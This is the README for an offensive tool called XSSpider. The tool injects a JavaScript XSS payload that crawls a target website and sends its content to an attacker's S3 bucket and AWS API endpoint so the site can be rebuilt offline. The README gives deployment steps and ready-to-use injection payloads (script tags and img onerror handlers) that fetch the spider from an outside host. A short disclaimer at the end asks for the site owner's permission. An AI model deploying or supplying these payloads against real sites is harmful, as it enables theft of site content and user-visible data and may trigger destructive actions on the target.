# XSSpider
This tool features a Javascript-based XSS payload used to crawl and exfiltrate website content. Data is stored in S3, and can be fully recreated and navigated in the attacker's local environment.

# Setup
## 1) Dependencies

### Amazon Web Services Account
Create an [AWS account](https://aws.amazon.com/free/) and configure your credentials for the [AWS CLI](http://docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html)

### Node Package Manager
NPM is required to run the Serverless Framework, install it [Here](https://nodejs.org/en/download/package-manager/).

### Install Serverless
```
npm install -g serverless
npm update -g serverless
```

### Install Serverless S3 Sync
```
npm install --save serverless-s3-sync
```

### Install Python 3.8.*
Python 3 is required for the local server to run. You can download it [Here](https://www.python.org/downloads/)

## 2) XSSpider Initial Setup & Deployment

### Update ./serverless.yml
The values for `service`, `s3Bucket_Payload`, and `s3Bucket_Server` will need to be changed to a unique name for your environment
```yaml
service: {{Your_Service_Name_Here}}

custom:
  s3Bucket_Payload: {{S3_Payload_Bucket}}
  s3Bucket_Server: {{S3_Server_Bucket}}
```

### Update ./handler.py
Using the value of `s3Bucket_Server` you entered in the serverless.yml file, update the value of `bucket_name`
```python
import json,boto3,time,base64,hashlib,re
from urllib.parse import unquote

s3 = boto3.client('s3')
bucket_name = '{{S3_Server_Bucket}}'
```

### Update ./static/payload.js
Using the value of `s3Bucket_Payload` you entered in the serverless.yml file, update the value of `spider_URL`
```javascript
var spider_URL = 'https://{{S3_Payload_Bucket}}.s3.amazonaws.com/spider.js';
```

### Deploy to AWS
Running the following command in console, Serverless will package up the resources and deploy them to your AWS environment
```
serverless deploy
```
Output:
```yml
Serverless: Stack update finished...
Service Information
service: {{Service_Name}}
stage: dev
region: us-east-1
stack: {{Service_Name}}-dev
resources: 16
api keys:
  None
endpoints:
  POST - https://{{abcd1234}}.execute-api.us-east-1.amazonaws.com/dev/storeData
functions:
  storeData: {{Service_Name}}-dev-storeData
```

## 3) Finalizing Setup & Testing

### Update ./static/spider.js
Referencing the output from the previous step, update the `storeData_URL` variable
```javascript
var storeData_URL = 'https://{{abcd1234}}.execute-api.us-east-1.amazonaws.com/dev/storeData';

$(document).ready(function() {
    base_url = window.location.host;
    ProcessHTML($.parseHTML($("html").html(), true));
})
```

### Re-deploy updated spider to AWS
```
serverless deploy
```
You are now ready to use XSSpider!

# Using XSSpider
### Initial Test
Running this code in the console of your [XSSpider demo site](https://S3_Payload_Bucket.s3.amazonaws.com/index.heml) will verify that everything was setup correctly.
```javascript
$.getScript('https://{{S3_Payload_Bucket}}.s3.amazonaws.com/spider.js')
```

### Practical Payloads
```html
<script src="https://{{S3_Payload_Bucket}}.s3.amazonaws.com/payload.js"></script>

<!-- jQuery is defined -->
<img/src=''/onerror="$.getScript('https://{{S3_Payload_Bucket}}.s3.amazonaws.com/payload.js')">

<!-- jQuery is not defined -->
<img src='' onerror="javascript:var script=document.createElement('script');script.src='https://{{S3_Payload_Bucket}}.s3.amazonaws.com/payload.js';document.head.appendChild(script);">
```

# Hosting Extracted Websites
### Download Content
Copy the S3 Bucket for your target site to the server directory
```
cd ./server
aws s3 cp s3://{{S3_Server_Bucket}}/{{Target_Site}} . --recursive
```

### Startup the Server
```
python3 server.py 8888
```
Navigate to http://localhost:8888 to view the site

# Docker
For those who don't want to use AWS and want to skip all the setup, a self-hosted Docker version of XSSpider is currently in development

# Disclaimer
*XSSpider will enumerate and interact with every link it comes accross. If the target site has not been developed properly, it could very well lead to deletion of data or other damaging effects. There is a blacklist of text to avoid, but does not gaurantee anything. Do no use without explicit permission from the target site owner.*